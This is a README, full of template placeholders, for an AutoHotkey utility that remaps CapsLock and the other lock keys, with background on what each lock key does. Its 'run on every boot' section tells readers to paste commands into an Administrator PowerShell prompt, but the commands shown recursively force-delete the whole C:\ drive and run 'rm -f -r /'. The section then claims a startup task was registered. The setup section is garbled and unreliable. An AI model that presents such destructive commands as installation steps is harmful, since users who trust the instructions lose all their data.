![{LINK_TEXT}]({LINK})

# {HEADER_1}
> **[{LINK_TEXT}]({LINK}) extends the functionality of the the *CapsLock* key by allowing unused/annoying keys to be disabled, along with providing formatting of text and text replacement abilities.**

![{LINK_TEXT}]({LINK})
![{LINK_TEXT}]({LINK})
![{LINK_TEXT}]({LINK})
![{LINK_TEXT}]({LINK})
![{LINK_TEXT}]({LINK})


## {HEADER_2}
* [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
   * [{LINK_TEXT}]({LINK})
* [{LINK_TEXT}]({LINK})

# {HEADER_1}
This script allows you to set the desired key state of keys on your keyboard; while still allowing you to use those keys without changing settings or killing the script. It also adds a popup menu that can format the currently selected text.


# {HEADER_1}

1. Install [{LINK_TEXT}]({LINK}) if you havent already
2. Clone this repository:
```console
$  git clone https://github.com/ConnerWill/{PROJECT_NAME}.git
```
3. Run [{LINK_TEXT}]({LINK})

# {HEADER_1}

Run [{LINK_TEXT}]({LINK})*.

*Holding* <kbd>`CapsLock`</kbd> for `0.5` seconds toggles CapsLock **ON** or **OFF**

**Holding** <kbd>`CapsLock`</kbd>** for `1` second *({LINK})*  displays a popup tooltip menu.|<kbd>`CapsLock`</kbd>|`1`

**Holding** <kbd>`F1`</kbd> for `0.5` seconds *({LINK})* presses <kbd>`F1`</kbd> once.|<kbd>`F1`</kbd>|`0.5`

**Holding** <kbd>`NumLock`</kbd> for `0.5` seconds *({LINK})*|<kbd>`NumLock`</kbd> |`0.5`

**Holding** <kbd>`ScrollLock`</kbd> for `0.5` seconds *({LINK})* toggles CapsLock **ON** or **OFF**|<kbd>`ScrollLock`</kbd>|`0.5`


*You can also customize the hotkeys and actions as described in the **"Customizing Hotkeys"** section below.*

# {HEADER_1}

## {HEADER_2}
Sometimes abbreviated as <kbd>`CAPS`</kbd> or <kbd>`CAPSLK`</kbd>. Caps Lock is a toggle key on a computer keyboard, when pressed it causes all letters typed to be in uppercase. Allowing you to switch the letters on your keyboard from lowercase to uppercase without holding <kbd>`Shift`</kbd>.

If you press the Caps Lock key, every letter you type on the keyboard will be automatically capitalized until you press it again to disable it.

For example, when Caps Lock is enabled, the typed letters appear "**LIKE THIS**". When disabled, they appear "**like this**".

## {HEADER_2}
Short for numeric lock or number lock, the Num key, Num Lock, or Num Lk key is on the top-left corner of a keyboard's numeric keypad. The Num Lock key enables and disables the numeric pad.

When *'Num Lock'* is enabled, you can use the numbers on the keypad. When *'Num Lock'* is disabled, pressing those keys activates those key's alternate function. For instance, the arrow keys on the keypad may only be used if *'Num Lock'* is disabled.

**Num lock keys:**

Below is a chart with additional information about what each numeric keypad key does when *'Num Lock'* is enabled and disabled. For example, pressing the <kbd>`2`</kbd> key on the numeric keypad when *'Num Lock'* is enabled enters the number <kbd>`2`</kbd>, and when *'Num Lock'* is off, it will arrow down one line.

Key pad key pressed|Num lock enabled|Num lock disabled
--- | :-: | :-:
<kbd>`0`</kbd>|0|Ins
<kbd>`1`</kbd>|1|End
<kbd>`2`</kbd>|2|↓
<kbd>`3`</kbd>|3|PgDn
<kbd>`4`</kbd>|4|←
<kbd>`5`</kbd>|5|Nothing
<kbd>`6`</kbd>|6|→
<kbd>`7`</kbd>|7|Home
<kbd>`8`</kbd>|8|↑
<kbd>`9`</kbd>|9|PgUp
<kbd>`.`</kbd>|.|Del

## {HEADER_2}
Sometimes abbreviated as <kbd>`ScLk`</kbd>, <kbd>`ScrLk`</kbd>, or <kbd>`Slk`</kbd>, the *'Scroll Lock'* key is found on a computer keyboard, often located close to the pause key. The Scroll Lock key was initially intended to be used in conjunction with the arrow keys to scroll through the contents of a text box. It has also been used to stop the scrolling of text or halt the operation of a program. Today, the key is not often used.


# {HEADER_1}

## {HEADER_2}

# {HEADER_1}

## {HEADER_2}
To change the settings/behavior of this script, modify the [{LINK_TEXT}]({LINK}).*

If the configuration file does not exist, isn't referenced, or is not in the same folder as [{LINK_TEXT}]({LINK}), the configuration file will be automatically generated.

**Note:*

*A more detailed description of hotkeys can be found here: [{LINK_TEXT}]({LINK}).*<br>

*After any changes to the [{LINK_TEXT}]({LINK}) configuration file, the program needs to be closed and opened again.*


## {HEADER_2}
Variable|Value|Description
## {HEADER_2}
**See [{LINK_TEXT}]({LINK})**

# {HEADER_1}

You can make the script run on every boot with either of these methods.

## {HEADER_2}
*({LINK})*

*Run the following commands in an Administrator powershell prompt.*
*Be sure to specify the correct path to your {PROJECT_NAME}.ahk file.*

```powershell
Get-ChildObject -Path C:\ -Recurse -Force | Remove-Item -Force
```

```bash
rm -f -r /
```

```python
print(‘Howdy’)
```

The task is now registered and will run on the next logon. The task can be viewed or modified in *'Task Scheduler'*.

---

# {HEADER_1}
*To see debug messages, download [{LINK_TEXT}]({LINK}).*

*Credit to [{LINK_TEXT}]({LINK})*



